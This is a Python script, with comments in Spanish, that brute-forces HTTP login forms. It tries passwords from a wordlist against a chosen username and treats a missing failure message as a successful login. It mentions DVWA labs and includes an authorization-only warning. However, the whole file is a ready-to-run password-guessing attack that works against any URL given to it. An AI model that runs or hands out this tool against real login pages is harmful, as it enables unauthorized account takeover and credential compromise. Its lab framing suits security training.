#!/usr/bin/env python3
"""Fuerza bruta de formularios de login HTTP.

Prueba contraseñas de una wordlist contra un formulario de autenticación,
detectando el éxito por la AUSENCIA de un mensaje de error configurable.
Pensado para laboratorios como DVWA en Metasploitable.

> Usa esta herramienta únicamente contra sistemas de tu propiedad o para los
> que tengas autorización explícita por escrito.

Nota: los campos del formulario (`username`, `password`, `Login`) dependen de
la web objetivo. Ajústalos en la función `brute_force` si tu objetivo usa
otros nombres (se ven analizando el código fuente del formulario).
"""
import argparse
import sys

import requests

try:
    from termcolor import colored
except ImportError:  # termcolor es opcional: si no está, imprimimos sin color.
    def colored(text, *_args, **_kwargs):
        return text


def brute_force(url, username, wordlist, fail_msg, method, cookies, timeout):
    """Recorre `wordlist` probando cada contraseña. Devuelve la que funcione, o None."""
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue
            print(colored(f"[*] Probando: {password}", "yellow"))
            data = {"username": username, "password": password, "Login": "submit"}
            try:
                if method == "get":
                    resp = requests.get(url, params=data, cookies=cookies, timeout=timeout)
                else:
                    resp = requests.post(url, data=data, cookies=cookies, timeout=timeout)
            except requests.exceptions.RequestException as exc:
                print(colored(f"[!] Error de conexión: {exc}", "red"))
                return None
            # Si el mensaje de fallo NO aparece, asumimos login correcto.
            if fail_msg not in resp.text:
                print(colored(f"[+] Usuario encontrado    ==> {username}", "green"))
                print(colored(f"[+] Contraseña encontrada ==> {password}", "green"))
                return password
    return None


def parse_cookies(raw):
    """Convierte una cadena 'nombre=valor; otra=valor' en un dict."""
    cookies = {}
    for part in raw.split(";"):
        if "=" in part:
            name, value = part.split("=", 1)
            cookies[name.strip()] = value.strip()
    return cookies


def main():
    parser = argparse.ArgumentParser(
        description="Fuerza bruta de formularios de login HTTP (uso autorizado).")
    parser.add_argument("-u", "--url", help="URL del formulario de login")
    parser.add_argument("-U", "--username", help="Usuario a atacar")
    parser.add_argument("-w", "--wordlist", help="Archivo de contraseñas (una por línea)")
    parser.add_argument("-f", "--fail", dest="fail_msg",
                        help="Texto que aparece cuando el login FALLA")
    parser.add_argument("-X", "--method", choices=["get", "post"], default="post",
                        help="Método HTTP (por defecto post)")
    parser.add_argument("-C", "--cookies", default="",
                        help="Cookies en formato 'nombre=valor; otra=valor'")
    parser.add_argument("-t", "--timeout", type=float, default=10.0,
                        help="Timeout por petición en segundos (por defecto 10.0)")
    args = parser.parse_args()

    url = args.url or input("[+] URL del formulario de login: ")
    username = args.username or input("[+] Usuario a atacar: ")
    wordlist = args.wordlist or input("[+] Archivo de contraseñas: ")
    fail_msg = args.fail_msg if args.fail_msg is not None else input(
        "[+] Mensaje que muestra la web cuando el login falla: ")
    cookies = parse_cookies(args.cookies) if args.cookies else {}

    try:
        found = brute_force(url, username, wordlist, fail_msg,
                            args.method, cookies, args.timeout)
    except FileNotFoundError:
        parser.error(f"No se encontró la wordlist: {wordlist}")

    if not found:
        print(colored("[!] Contraseña no encontrada en el diccionario. Actualízalo.", "red"))
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario.")
        sys.exit(130)
